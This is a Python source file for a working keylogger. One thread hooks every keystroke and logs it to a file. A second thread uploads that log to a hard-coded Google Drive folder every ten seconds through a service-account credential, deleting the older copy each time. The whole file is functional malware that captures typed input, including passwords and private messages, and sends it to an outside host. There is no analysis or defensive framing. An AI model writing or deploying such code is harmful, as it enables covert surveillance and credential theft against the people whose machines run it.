import threading
from threading import Thread
import logging
import keyboard
from google.oauth2 import service_account
from googleapiclient.http import MediaFileUpload
from googleapiclient.discovery import build
import time


def save_key(event):
    logging.info(str(event))


def logger():
    logging.basicConfig(filename='latest.log', filemode='a', format='[%(asctime)s]: %(message)s', level=logging.INFO)
    logging.info('__log start__')
    with open('C:/Users/nikot/Desktop/1.txt', 'r') as file:
        if file.read() != '1':
            keyboard.hook(save_key)
            keyboard.wait()


def loader():
    scopes = ['https://www.googleapis.com/auth/drive']
    service_account_file = 'C:/Users/nikot/Desktop/logger/keylogger-282819-7c70753b5a94.json'
    credentials = service_account.Credentials.from_service_account_file(service_account_file, scopes=scopes)
    service = build('drive', 'v3', credentials=credentials)
    last_id = 0
    with open('C:/Users/nikot/Desktop/1.txt', 'r') as file:
        if file.read() != '1':
            while True:
                folder_id = '1KrHbzTNzYN__XogOqaeUeDo0nkxWqkcN'
                name = 'latest.log'
                file_path = 'C:/Users/nikot/Desktop/logger/latest.log'
                file_metadata = {
                    'name': name,
                    'parents': [folder_id]
                }
                media = MediaFileUpload(file_path, resumable=True)
                r = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
                if last_id != 0:
                    service.files().delete(fileId=last_id).execute()
                last_id = r['id']
                time.sleep(10)


thread_logger = Thread(target=logger)
thread_loader = Thread(target=loader)
thread_logger.start()
thread_loader.start()
